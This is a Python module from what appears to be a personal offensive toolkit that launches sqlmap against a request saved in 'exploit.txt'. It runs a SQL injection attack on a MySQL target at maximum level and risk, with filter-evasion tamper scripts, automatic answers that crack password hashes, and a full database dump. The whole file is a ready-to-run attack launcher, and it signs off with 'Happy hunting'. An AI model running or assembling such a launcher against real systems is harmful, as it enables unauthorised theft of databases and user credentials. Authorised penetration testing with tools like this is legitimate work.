#!/usr/bin/python
# nu11secur1ty 2023-2025
# User-Agent / URLi style module

import os
import sys
import time
import subprocess
from colorama import init, Fore, Style

init(convert=True)

def main():
    try:
        # Dynamically find the repository base folder (parent of modules/)
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        exploit_path = os.path.join(base_dir, 'exploit.txt')

        sqlmap_path = r'D:\CVE\sqlmap-nu11secur1ty\sqlmap.py'  # adjust if needed

        # Check exploit file
        if not os.path.exists(exploit_path):
            print(Fore.RED + f"❌ Exploit file not found at: {exploit_path}. Please generate it first." + Style.RESET_ALL)
            return

        if not os.path.isfile(sqlmap_path):
            print(Fore.YELLOW + f"[!] Warning: sqlmap.py not found at '{sqlmap_path}'. Update sqlmap_path if needed." + Style.RESET_ALL)
            # continue anyway — subprocess will raise if path is wrong

        args = [
            sys.executable, sqlmap_path,
            "-r", exploit_path,
            "--tamper=space2comment,apostrophemask,bypass",
            "--dbms=mysql",
            "--time-sec=7",
            "--random-agent",
            "--level=5",
            "--risk=3",
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump"
        ]

        print(Fore.YELLOW + "\n[+] Launching sqlmap now. Press Ctrl+C to stop.\n" + Style.RESET_ALL)

        proc = None
        try:
            # Start sqlmap as a child process and stream its output to the console
            proc = subprocess.Popen(args)
            # wait() will block until the child finishes; KeyboardInterrupt will be raised here if user presses Ctrl+C
            proc.wait()
        except KeyboardInterrupt:
            # Ctrl+C detected — try graceful termination
            print(Fore.YELLOW + "\n[!] Interrupted by user. Attempting to terminate sqlmap..." + Style.RESET_ALL)
            try:
                if proc and proc.poll() is None:
                    proc.terminate()  # ask it to exit
                    # give it a short time to exit nicely
                    timeout = 2.0
                    start = time.time()
                    while proc.poll() is None and (time.time() - start) < timeout:
                        time.sleep(0.1)
                    if proc.poll() is None:
                        proc.kill()  # force kill
            except Exception as e:
                print(Fore.YELLOW + f"[!] Error terminating sqlmap process: {e}" + Style.RESET_ALL)
            finally:
                # ensure child resources cleaned
                try:
                    if proc:
                        proc.wait(timeout=1)
                except Exception:
                    pass
                print(Fore.YELLOW + "[!] sqlmap terminated. Returning to menu...\n" + Style.RESET_ALL)
                return
        except FileNotFoundError as e:
            print(Fore.RED + f"❌ Execution failed: {e}. Check sqlmap path: {sqlmap_path}" + Style.RESET_ALL)
            return
        except Exception as e:
            print(Fore.RED + f"❌ Failed to run sqlmap: {e}" + Style.RESET_ALL)
            return

        # Completed normally
        print(Fore.RED + "\nHappy hunting with nu11secur1ty =)" + Style.RESET_ALL)

    except KeyboardInterrupt:
        # top-level guard
        print(Fore.YELLOW + "\n[!] Cancelled by user. Exiting module cleanly." + Style.RESET_ALL)
        return

if __name__ == "__main__":
    main()
